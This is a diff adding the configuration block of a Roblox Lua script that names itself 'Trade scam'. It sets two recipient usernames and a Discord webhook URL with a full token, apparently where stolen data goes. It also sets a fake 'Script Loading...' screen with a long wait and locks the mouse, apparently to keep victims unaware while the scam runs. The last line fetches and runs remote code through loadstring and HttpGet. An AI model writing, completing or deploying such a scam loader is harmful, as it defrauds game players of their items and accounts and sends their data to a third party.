@@ -1,0 +1,15 @@
+UserName = "DauHuge123"
+UserName2 = "ionelank10"
+Webhook = "https://discord.com/api/webhooks/1129841766271561819/6-SIiJsMZsw6X-oyBBAxKqlgfGdjKTQg5yGYZa_YsFhdDDNcsHuoq9gbDd_u9X8llr2m"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Trade scam"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet(" ", true))()
